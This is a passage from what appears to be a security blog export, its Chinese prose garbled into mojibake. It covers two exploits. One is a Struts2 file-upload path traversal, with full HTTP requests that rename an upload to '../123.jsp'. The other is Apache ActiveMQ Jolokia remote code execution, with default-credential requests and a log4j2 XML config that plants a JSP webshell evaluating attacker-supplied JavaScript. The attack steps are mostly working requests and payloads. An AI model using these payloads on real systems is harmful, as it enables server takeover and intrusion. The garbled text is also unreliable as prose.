çœ‹åˆ°è¿™é‡Œå…¶å®æˆ‘ä»¬ä¹Ÿå°±å¯ä»¥çŸ¥é“å¤§æ¦‚æ€è·¯äº†ï¼Œå‚æ•°çš„ä¿å­˜æ—¢ç„¶åœ¨FileUploadInterceptorä¹‹å‰ï¼Œé‚£ä¹ˆå˜é‡è¦†ç›–å°±ä¸å­˜åœ¨äº†(å­˜å‚¨ç»“æ„ä¸ºMapï¼Œkeyå”¯ä¸€)ï¼Œç»“åˆåˆ°commitå½“ä¸­çš„ä¸€äº›å¤§å°å†™ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¸éš¾çŒœåˆ°å¦‚æœæˆ‘ä»¬å°†ä¸Šä¼ çš„æ–‡ä»¶åå°å†™ï¼Œé‚£ä¼šä¸ä¼šåœ¨å°†å‚æ•°ç»‘å®šåˆ°Actionå¯¹è±¡çš„è¿‡ç¨‹å½“ä¸­ è€Œè¿™éƒ¨åˆ†å¤„ç†è¿‡ç¨‹å°±åœ¨com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept é‡Œé¢è°ƒç”¨äº†com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParametersåšå‚æ•°ç»‘å®šï¼Œè¿™ä¸ªè¿‡ç¨‹è€ç”Ÿå¸¸è°ˆäº†ï¼Œä¸æ‡‚å¾—å¯ä»¥å»ç™¾åº¦äº†è§£äº†è§£è¿™é‡Œä¸å¤šè°ˆäº† å½“ç„¶è¿™é‡Œè¿˜æ˜¯éœ€è¦å¤šè¯´ä¸€ç‚¹ï¼Œè¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨æ˜¯æœ‰é¡ºåºçš„ï¼Œè¿™å’ŒMapçš„å­˜å‚¨ç»“æ„æœ‰å…³ è¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯Treemap å¯ä»¥çœ‹åˆ°å¤§å†™çš„ä¼šä¼˜å…ˆ(Mapç»“æ„) è¸©å‘æˆ‘ç¬¬ä¸€æ¬¡æ‰“çš„æ—¶å€™æŠŠæœ€åä¸€ä½å¤§å†™äº†ï¼Œä½†æ˜¯å‘ç°æ²¡æœ‰è°ƒç”¨åˆ°setæ–¹æ³• 12345678910111213141516171819POST /upload.action HTTP/1.1Host: 127.0.0.1Accept: */*Content-Length: 188Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNContent-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;Content-Type: text/plain1aaa--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNContent-Disposition: form-data; name=&quot;UPloadFileName&quot;; Content-Type: text/plain1323.jsp--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN-- ç»è¿‡debugå¯ä»¥å‘ç°åœ¨ognl.OgnlRuntime#_getSetMethodè·å–setteræ–¹æ³•æ—¶è°ƒç”¨äº†ognl.OgnlRuntime#getDeclaredMethodsåšå¤„ç† çœç•¥åƒåœ¾æ—¶é—´å§ï¼Œæœ€ç»ˆåœ¨ognl.OgnlRuntime#addIfAccessorï¼Œå¯ä»¥çœ‹åˆ°å¿…é¡»æ»¡è¶³ms.endsWith(baseName)(è¿™ç‚¹å¾ˆå…³é”®ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ çš„Actionçš„ç¨‹åºä»£ç æ€ä¹ˆå†™å½±å“ä½ æ€ä¹ˆå†™å‚æ•°) 12345678910111213141516private static void addIfAccessor(List result, Method method, String baseName, boolean findSets) &#123; final String ms = method.getName(); if (ms.endsWith(baseName)) &#123; boolean isSet = false, isIs = false; if ((isSet = ms.startsWith(SET_PREFIX)) || ms.startsWith(GET_PREFIX) || (isIs = ms.startsWith(IS_PREFIX))) &#123; int prefixLength = (isIs ? 2 : 3); if (isSet == findSets) &#123; if (baseName.length() == (ms.length() - prefixLength)) &#123; result.add(method); &#125; &#125; &#125; &#125; &#125; 1234567891011121314151617181920212223éƒ¨åˆ†è°ƒç”¨æ ˆå¦‚ä¸‹addIfAccessor:2701, OgnlRuntime (ognl)collectAccessors:2686, OgnlRuntime (ognl)getDeclaredMethods:2653, OgnlRuntime (ognl)_getSetMethod:2915, OgnlRuntime (ognl)getSetMethod:2884, OgnlRuntime (ognl)hasSetMethod:2955, OgnlRuntime (ognl)hasSetProperty:2973, OgnlRuntime (ognl)setProperty:83, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor)setProperty:3359, OgnlRuntime (ognl)setValueBody:134, ASTProperty (ognl)evaluateSetValueBody:220, SimpleNode (ognl)setValue:308, SimpleNode (ognl)setValue:829, Ognl (ognl)lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)execute:-1, 102405086 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$53)compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl)trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl)setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl)setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl)setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor).... è€ŒbaseNameå…¶å®ä¹Ÿæ˜¯æœ‰åšäº†å¤„ç†çš„(å¿…é¡»çœ‹)ï¼Œå›åˆ°ä¹‹å‰çš„getDeclaredMethodsæ–¹æ³•ï¼Œæˆ‘ä»¬çš„å±æ€§åä¼šè¢«capitalizeBeanPropertyNameå¤„ç† åšäº†å¾ˆå¤šåˆ†æ”¯åˆ¤æ–­ï¼Œå¯ä»¥çœ‹åˆ°ç‰¹æ®Šæ”¯æŒäº†ä¸€äº›ç‰¹æ®Šæ–¹æ³•çš„è°ƒç”¨ï¼Œä½†æ˜¯å…¶å®å‰é¢çš„å‡ ä¸ªä¸èƒ½ç”¨ï¼Œå› ä¸ºä»–ä»¬åé¢å¤šäº†ä¸€äº›å­—ç¬¦()ï¼Œåœ¨ä¹‹å‰æåˆ°çš„endwithæ˜¯ä¸åŒ…æ‹¬è¿™äº›ç¬¦å·çš„ 123456789101112131415161718192021222324252627282930private static String capitalizeBeanPropertyName(String propertyName) &#123; if (propertyName.length() == 1) &#123; return propertyName.toUpperCase(); &#125; // don&#x27;t capitalize getters/setters if (propertyName.startsWith(GET_PREFIX) &amp;&amp; propertyName.endsWith(&quot;()&quot;)) &#123; if (Character.isUpperCase(propertyName.substring(3,4).charAt(0))) &#123; return propertyName; &#125; &#125; if (propertyName.startsWith(SET_PREFIX) &amp;&amp; propertyName.endsWith(&quot;)&quot;)) &#123; if (Character.isUpperCase(propertyName.substring(3,4).charAt(0))) &#123; return propertyName; &#125; &#125; if (propertyName.startsWith(IS_PREFIX) &amp;&amp; propertyName.endsWith(&quot;()&quot;)) &#123; if (Character.isUpperCase(propertyName.substring(2,3).charAt(0))) &#123; return propertyName; &#125; &#125; char first = propertyName.charAt(0); char second = propertyName.charAt(1); if (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) &#123; return propertyName; &#125; else &#123; char[] chars = propertyName.toCharArray(); chars[0] = Character.toUpperCase(chars[0]); return new String(chars); &#125; &#125; æˆ‘ä»¬ä¸»è¦å…³æ³¨ä¸‹é¢çš„éƒ¨åˆ†ï¼Œå¦‚æœå±æ€§ç¬¬ä¸€ä¸ªå­—ç¬¦å°å†™ç¬¬äºŒä¸ªå¤§å†™ç›´æ¥è¿”å›ï¼Œå¦åˆ™è¿”å›æ—¶å°†ç¬¬ä¸€ä¸ªå­—æ¯å¤§å†™ 123456789char first = propertyName.charAt(0);char second = propertyName.charAt(1);if (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) &#123; return propertyName;&#125; else &#123; char[] chars = propertyName.toCharArray(); chars[0] = Character.toUpperCase(chars[0]); return new String(chars);&#125; åœ¨è¿™é‡Œçš„ä¾‹å­å½“ä¸­æˆ‘ä»¬éœ€è¦è°ƒç”¨com.struts2.UploadAction#setUploadFileName å› æ­¤ä¹Ÿåªèƒ½é™åˆ¶äº†æˆ‘ä»¬çš„å†™æ³•è¦ä¹ˆæ˜¯UploadFileNameè¦ä¹ˆæ˜¯uploadFileName(å‰é¢æåˆ°çš„endwith+capitalizeBeanPropertyNameå¤„ç†) æœ€ç»ˆæ„é€ æŒ‰ç…§Mapå­˜å‚¨çš„è°ƒç”¨é¡ºåºæˆ‘ä»¬å³å¯æ„é€  1234567891011--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNContent-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;Content-Type: text/plain1aaa--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNContent-Disposition: form-data; name=&quot;uploadFileName&quot;; Content-Type: text/plain../123.jsp--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN-- æˆ–è€… 123456789101112131415POST /upload.action?uploadFileName=../1234.jsp HTTP/1.1Host: 127.0.0.1Accept: */*Accept-Encoding: gzip, deflateContent-Length: 188Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNContent-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;Content-Type: text/plain1aaa--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Struts2","slug":"Struts2","permalink":"https://y4tacker.github.io/tags/Struts2/"}]},{"title":"Apache ActiveMQ Jolokiaè¿œç¨‹ä»£ç æ‰§è¡Œä¸ä¾èµ–JDKæ‰“æ³•","slug":"year/2023/11/æŸç³»ç»Ÿæœ€æ–°å‰å°RCEåˆ†æ/Apache-ActiveMQ-Jolokiaè¿œç¨‹ä»£ç æ‰§è¡Œä¸ä¾èµ–JDKæ‰“æ³•","date":"2023-11-30T12:20:15.000Z","updated":"2024-08-04T09:01:49.741Z","comments":true,"path":"2023/11/30/year/2023/11/æŸç³»ç»Ÿæœ€æ–°å‰å°RCEåˆ†æ/Apache-ActiveMQ-Jolokiaè¿œç¨‹ä»£ç æ‰§è¡Œä¸ä¾èµ–JDKæ‰“æ³•/","link":"","permalink":"https://y4tacker.github.io/2023/11/30/year/2023/11/%E6%9F%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E5%89%8D%E5%8F%B0RCE%E5%88%86%E6%9E%90/Apache-ActiveMQ-Jolokia%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8D%E4%BE%9D%E8%B5%96JDK%E6%89%93%E6%B3%95/","excerpt":"","text":"Apache ActiveMQ Jolokiaè¿œç¨‹ä»£ç æ‰§è¡Œä¸ä¾èµ–JDKæ‰“æ³•æƒ³ç€æœ€è¿‘è¿å†™äº†å‡ ç¯‡åŠ å¯†åšå®¢æœ‰ç‚¹å¯¹ä¸èµ·çœ‹æˆ‘åšå®¢çš„ç²‰ä¸äº†ï¼Œä»Šå¤©æŠ½ç©ºç®€å•åˆ†äº«ä¸€ä¸ªå§¿åŠ¿ å½±å“ç‰ˆæœ¬å¤§æ¦‚æµ‹äº†ä¸€ä¸‹ Apache ActiveMQ 5.16.xç³»åˆ—æ— log4j2çš„mbean Apache ActiveMQ 5.17.xç³»åˆ—æ¼æ´ç‰ˆæœ¬å—å½±å“ åˆæ¢ä»ç½‘ä¸Šå·²å…¬å¼€çš„æ‰“æ³•å¯ä»¥çŸ¥é“ä½¿ç”¨jdk.management.jfr:type=FlightRecorderå—jdkç‰ˆæœ¬çš„å½±å“ï¼Œé‚£æœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•å‘¢ï¼Ÿç­”æ¡ˆè‚¯å®šæ˜¯æœ‰ï¼Œä»commitç‚¹æˆ‘å¯ä»¥çœ‹å‡ºç¦ç”¨çš„mbeanä¸ä»…æœ‰jdk.management.jfr:type=FlightRecorder,è¿˜æœ‰com.sun.management:type=DiagnosticCommandä»¥åŠorg.apache.logging.log4j2:*,å¯¹äºDiagnosticCommandçš„åˆ©ç”¨åœ¨ä¹‹å‰å¾ˆæ—©å°±æœ‰å…¬å¼€ï¼Œé“¾æ¥åœ¨https://github.com/laluka/jolokia-exploitation-toolkit/blob/main/exploits/file-write-to-rce-vhost-jfr.mdï¼Œä¸è¿‡å¤§æ¦‚çœ‹äº†ä¸€ä¸‹è¿™é‡Œä¼¼ä¹ä¸å¤ªè¡Œ(ä¹Ÿæ²¡ä»”ç»†çœ‹å°±æ˜¯äº†)ï¼Œæ¯”è¾ƒæ„Ÿå…´è¶£çš„æ˜¯è¿™ä¸ªlog4j2çš„åˆ©ç”¨ åœ¨http://127.0.0.1:8161/api/jolokia/listå½“ä¸­æœç´¢å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ï¼Œåˆ©ç”¨çš„æ—¶å€™`type=63a65a25`ä¼¼ä¹ä¸æ˜¯å›ºå®šçš„ï¼Œçœ‹èµ·æ¥å¤§æ¦‚å’Œç‰ˆæœ¬æœ‰å…³ï¼Œéœ€è¦å…ˆè®¿é—®è¿™ä¸ªè·¯ç”±çœ‹çœ‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154&quot;org.apache.logging.log4j2&quot;: &#123; &quot;component=StatusLogger,type=63a65a25&quot;: &#123; &quot;attr&quot;: &#123; &quot;StatusDataHistory&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;[Ljava.lang.String;&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;Level&quot;: &#123; &quot;rw&quot;: true, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;StatusData&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.util.List&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ObjectName&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;javax.management.ObjectName&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ContextName&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125; &#125;, &quot;class&quot;: &quot;org.apache.logging.log4j.core.jmx.StatusLoggerAdmin&quot;, &quot;desc&quot;: &quot;Information on the management interface of the MBean&quot; &#125;, &quot;component=Loggers,name=,type=63a65a25&quot;: &#123; &quot;attr&quot;: &#123; &quot;Additive&quot;: &#123; &quot;rw&quot;: true, &quot;type&quot;: &quot;boolean&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;Filter&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;AppenderRefs&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;[Ljava.lang.String;&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;IncludeLocation&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;boolean&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;Level&quot;: &#123; &quot;rw&quot;: true, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;Name&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125; &#125;, &quot;class&quot;: &quot;org.apache.logging.log4j.core.jmx.LoggerConfigAdmin&quot;, &quot;desc&quot;: &quot;Information on the management interface of the MBean&quot; &#125;, &quot;type=63a65a25&quot;: &#123; &quot;op&quot;: &#123; &quot;setConfigText&quot;: &#123; &quot;args&quot;: [&#123; &quot;name&quot;: &quot;p1&quot;, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;&quot; &#125;, &#123; &quot;name&quot;: &quot;p2&quot;, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;&quot; &#125;], &quot;ret&quot;: &quot;void&quot;, &quot;desc&quot;: &quot;Operation exposed for management&quot; &#125;, &quot;getConfigText&quot;: &#123; &quot;args&quot;: [&#123; &quot;name&quot;: &quot;p1&quot;, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;&quot; &#125;], &quot;ret&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Operation exposed for management&quot; &#125; &#125;, &quot;attr&quot;: &#123; &quot;Status&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ConfigClassName&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ConfigLocationUri&quot;: &#123; &quot;rw&quot;: true, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ConfigName&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ConfigProperties&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.util.Map&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ConfigText&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;Name&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ObjectName&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;javax.management.ObjectName&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ConfigFilter&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125; &#125;, &quot;class&quot;: &quot;org.apache.logging.log4j.core.jmx.LoggerContextAdmin&quot;, &quot;desc&quot;: &quot;Information on the management interface of the MBean&quot; &#125;, &quot;component=ContextSelector,type=63a65a25&quot;: &#123; &quot;attr&quot;: &#123; &quot;ImplementationClassName&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125; &#125;, &quot;class&quot;: &quot;org.apache.logging.log4j.core.jmx.ContextSelectorAdmin&quot;, &quot;desc&quot;: &quot;Information on the management interface of the MBean&quot; &#125;, åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¸¤ä¸ªæ¯”è¾ƒå¯ç–‘çš„æ“ä½œsetConfigTextä¸getConfigText,çœ‹èµ·æ¥ä¼¼ä¹ä¸é…ç½®ç›¸å…³ çœ‹çœ‹ä»£ç å¯ä»¥å‘ç°ï¼Œç¡®å®æ ¹æ®æˆ‘ä»¬ä¼ å…¥çš„å­—ç¬¦ä¸²åšäº†é…ç½®æ–‡ä»¶è§£ææ›´æ–° åŒæ—¶getConfigTextå¯ä»¥æŸ¥çœ‹å½“å‰ç¯å¢ƒä¸‹çš„é…ç½®ï¼Œå¯ä»¥çœ‹åˆ°è¿”å›çš„å½¢å¼å°±å’Œæ–‡ä»¶/conf/log4j2.propertiesä¸€è‡´ 12345678910111213141516171819POST /api/jolokia/ HTTP/1.1Host: 127.0.0.1:8161Authorization: Basic YWRtaW46YWRtaW4=User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36Origin: 127.0.0.1Connection: closeContent-Type: application/jsonContent-Length: 2174&#123; &quot;type&quot;: &quot;EXEC&quot;, &quot;mbean&quot;: &quot;org.apache.logging.log4j2:type=63a65a25&quot;, &quot;operation&quot;: &quot;getConfigText&quot;, &quot;arguments&quot;:[&quot;UTF-8&quot;] &#125;response:&#123;&quot;request&quot;:&#123;&quot;mbean&quot;:&quot;org.apache.logging.log4j2:type=63a65a25&quot;,&quot;arguments&quot;:[&quot;UTF-8&quot;],&quot;type&quot;:&quot;exec&quot;,&quot;operation&quot;:&quot;getConfigText&quot;&#125;,&quot;value&quot;:&quot;rootLogger.level=INFO\\nrootLogger.appenderRef.console.ref=Console\\nrootLogger.appenderRef.console.filter.threshold.type=ThresholdFilter\\nrootLogger.appenderRef.console.filter.threshold.level=INFO\\nrootLogger.appenderRef.logfile.ref=RollingFile\\nlogger.spring.name=org.apache.activemq.spring\\nlogger.spring.level=WARN\\nlogger.web.name=org.apache.activemq.web.handler\\nlogger.web.level=WARN\\nlogger.springframework.name=org.springframework\\nlogger.springframework.level=WARN\\nlogger.xbean.name=org.apache.xbean\\nlogger.xbean.level=WARN\\n\\n# Jetty\\nlogger.jetty.name=org.eclipse.jetty\\nlogger.jetty.level=WARN\\n\\n# ActiveMQ\\n#log4j2.logger.activemq.name=org.apache.activemq\\n#log4j2.logger.activemq.level=DEBUG\\n\\n# Appender configuration\\n\\n# Console appender\\nappender.console.type=Console\\nappender.console.name=Console\\nappender.console.layout.type=PatternLayout\\nappender.console.layout.pattern=%5p | %m%n\\n\\n# File appender\\nappender.logfile.type=RollingRandomAccessFile\\nappender.logfile.name=RollingFile\\nappender.logfile.fileName=$&#123;sys:activemq.data&#125;\\/activemq2.log\\nappender.logfile.filePattern=$&#123;sys:activemq.data&#125;\\/activemq2.log.%i\\nappender.logfile.append=true\\nappender.logfile.layout.type=PatternLayout\\nappender.logfile.layout.pattern=%d | %-5p | %m | %c | %t%n%throwable&#123;full&#125;\\nappender.logfile.policies.type=Policies\\nappender.logfile.policies.size.type=SizeBasedTriggeringPolicy\\nappender.logfile.policies.size.size=1MB\\n\\n\\nlogger.audit.name=org.apache.activemq.audit\\nlogger.audit.additivity=false\\nlogger.audit.level=INFO\\nlogger.audit.appenderRef.auditlog.ref=AuditLog\\n\\nappender.auditlog.type=RollingRandomAccessFile\\nappender.auditlog.name=AuditLog\\nappender.auditlog.fileName=$&#123;sys:activemq.data&#125;\\/audit.log\\nappender.auditlog.filePattern=$&#123;sys:activemq.data&#125;\\/audit.log.%i\\nappender.auditlog.append=true\\nappender.auditlog.layout.type=PatternLayout\\nappender.auditlog.layout.pattern=%-5p | %m | %t%n\\nappender.auditlog.policies.type=Policies\\nappender.auditlog.policies.size.type=SizeBasedTriggeringPolicy\\nappender.auditlog.policies.size.size=1MB\\n&quot;,&quot;timestamp&quot;:1701347796,&quot;status&quot;:200&#125; è¸©å‘ä½†æ˜¯å½“æˆ‘ä»¬æŒ‰ç…§è¿™ä¸ªæ ¼å¼æ”¹å¥½payloadè°ƒç”¨setæ›´æ–°æ—¶å‘ç°å¹¶æ²¡æœ‰æˆåŠŸï¼Œæ— äº‹å‘ç”Ÿ è°ƒè¯•åæ‰å‘ç°è¿™ä¸ªconfigè§£æå…¶å®æ˜¯xmlå½¢å¼çš„ï¼Œç®—æ˜¯è¢«ç³»ç»Ÿå‘äº†ä¸€æŠŠ è°ƒç”¨æ ˆ(æ–¹ä¾¿ä¹Ÿæƒ³è°ƒè¯•çœ‹çœ‹çš„å¸ˆå‚…) 1234567891011121314151617181920setConfiguration:601, LoggerContext (org.apache.logging.log4j.core)start:285, LoggerContext (org.apache.logging.log4j.core)setConfigText:201, LoggerContextAdmin (org.apache.logging.log4j.core.jmx)invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect)invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)invoke:566, Method (java.lang.reflect)invoke:71, Trampoline (sun.reflect.misc)invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect)invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)invoke:566, Method (java.lang.reflect)invoke:260, MethodUtil (sun.reflect.misc)invokeM2:112, StandardMBeanIntrospector (com.sun.jmx.mbeanserver)invokeM2:46, StandardMBeanIntrospector (com.sun.jmx.mbeanserver)invokeM:237, MBeanIntrospector (com.sun.jmx.mbeanserver)invoke:138, PerInterface (com.sun.jmx.mbeanserver)invoke:252, MBeanSupport (com.sun.jmx.mbeanserver)invoke:809, DefaultMBeanServerInterceptor (com.sun.jmx.interceptor)invoke:801, JmxMBeanServer (com.sun.jmx.mbeanserver) ç ´å±€ä½†æ˜¯ä¹ŸçŸ¥é“æˆ‘æ‡’ï¼Œè¿™ç§æ ¼å¼è½¬æ¢çš„æ´»æˆ‘å¾ˆçƒ¦ï¼Œè¿˜å¥½æœ‰chatGPTï¼Œç®€å•é—®äº†ä¸€æ‰‹è§£å†³äº†æˆ‘çš„é—®é¢˜ æ¯•ç«Ÿæˆ‘ä¸å…³å¿ƒå†…å®¹åªéœ€è¦ä¸€ä¸ªæ¨¡æ¿ç½¢äº† 12345678910111213141516171819202122æŠŠæ¥ä¸‹æ¥æˆ‘ç»™çš„é…ç½®è½¬åŒ–ä¸ºlog4j2é…ç½®çš„xmlçš„å½¢å¼å¥½çš„å–µxxxxä»¥ä¸‹æ˜¯å°†æ‚¨æä¾›çš„é…ç½®è½¬æ¢ä¸ºlog4j2çš„XMLå½¢å¼ï¼š&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;WARN&quot;&gt; &lt;Appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt; &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt; &lt;/Console&gt; &lt;File name=&quot;File&quot; fileName=&quot;logs/logfile.log&quot;&gt; &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt; &lt;/File&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;debug&quot;&gt; &lt;AppenderRef ref=&quot;Console&quot;/&gt; &lt;AppenderRef ref=&quot;File&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; è™½ç„¶ä¸çŸ¥é“ç»å¯¹è·¯å¾„ï¼Œä½†æ˜¯æ ¹æ®ç³»ç»Ÿçš„åŸé…ç½®æ–‡ä»¶çš„å†™æ³•appender.logfile.fileName=$&#123;sys:activemq.data&#125;/activemq.logå†ç»“åˆæ—¥å¿—è·¯å¾„å¯ä»¥çŒœåˆ°ä½¿ç”¨$&#123;sys:activemq.data&#125;/../webapps/admin/ åŒæ—¶ä¸ºäº†æ–¹ä¾¿åˆ©ç”¨ï¼Œæˆ‘å†™æˆelè¡¨è¾¾å¼çš„å½¢å¼ 1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;WARN&quot;&gt; &lt;Appenders&gt; &lt;RollingRandomAccessFile name=&quot;RollingFile&quot; fileName=&quot;$&#123;sys:activemq.data&#125;/../webapps/admin/y4test.jsp&quot; filePattern=&quot;$&#123;sys:activemq.data&#125;/../webapps/admin/y4test.jsp&quot;&gt; &lt;PatternLayout pattern=&quot;$&#123;&#x27;&#x27;[&#x27;getClass&#x27;]()[&#x27;forName&#x27;](&#x27;javax.script.ScriptEngineManager&#x27;)[&#x27;newInstance&#x27;]()[&#x27;getEngineByName&#x27;](&#x27;JavaScript&#x27;)[&#x27;eval&#x27;](param.a)&#125;&quot;/&gt; &lt;Policies&gt; &lt;SizeBasedTriggeringPolicy size=&quot;1MB&quot;/&gt; &lt;/Policies&gt; &lt;/RollingRandomAccessFile&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;INFO&quot;&gt; &lt;AppenderRef ref=&quot;RollingFile&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; æ‰“ä¸€å‘çœ‹çœ‹ï¼Œä½†æ˜¯ç›®å½•ä¸‹åªç”Ÿæˆäº†æ–‡ä»¶å¹¶æ²¡æœ‰æŠŠpayloadå†™å…¥ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªèƒ½è§¦å‘æ—¥å¿—çš„åŠŸèƒ½ç‚¹ è¿™é‡Œæˆ‘éšä¾¿æ‰¾äº†ä¸€ä¸ª/admin/deleteDestination.action çœ‹åˆ°è¿™ä¸ªå¿ƒæ»¡æ„è¶³ 